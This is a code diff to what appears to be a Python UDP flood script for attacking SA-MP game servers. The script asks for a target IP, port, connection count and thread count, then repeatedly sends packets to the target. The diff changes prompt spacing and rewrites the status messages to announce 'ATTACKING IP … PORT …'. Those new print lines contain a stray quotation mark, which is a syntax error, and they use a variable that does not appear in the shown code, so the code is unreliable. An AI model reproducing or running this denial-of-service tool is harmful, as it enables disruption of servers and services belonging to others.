@@ -16,11 +16,11 @@ print("""\033[96m\n
 
 print("TOOLS FOR UDP SA-MP SERVER")
 
-ip = str(input("➣IP : "))
-port = int(input("➣PORT : "))
-choice = str(input("➣ARE YOU READY (y/n) : "))
-times = int(input("➣CONNECTIONS : "))
-threads = int(input("➣THREADS : "))
+ip = str(input("➣  IP : "))
+port = int(input("➣  PORT : "))
+choice = str(input("➣  ARE YOU READY (y/n) : "))
+times = int(input("➣  CONNECTIONS : "))
+threads = int(input("➣  THREADS : "))
 
 os.system("clear")
 def run():
@@ -32,7 +32,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XNUXER NIH DECK")
+			print(i +" XNUXER ATTACKING IP %s PORT %s"%(orgip,port) ")
 		except:
 			print("[>] SERVER HAS BEEN MT")
 
@@ -46,7 +46,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" XNUXER NIH DECK!!!")
+			print(i +"  XNUXER ATTACKING IP %s PORT %s"%(orgip,port) ")
 		except:
 			s.close()
 			print("[>] AMFUN SAYANK")
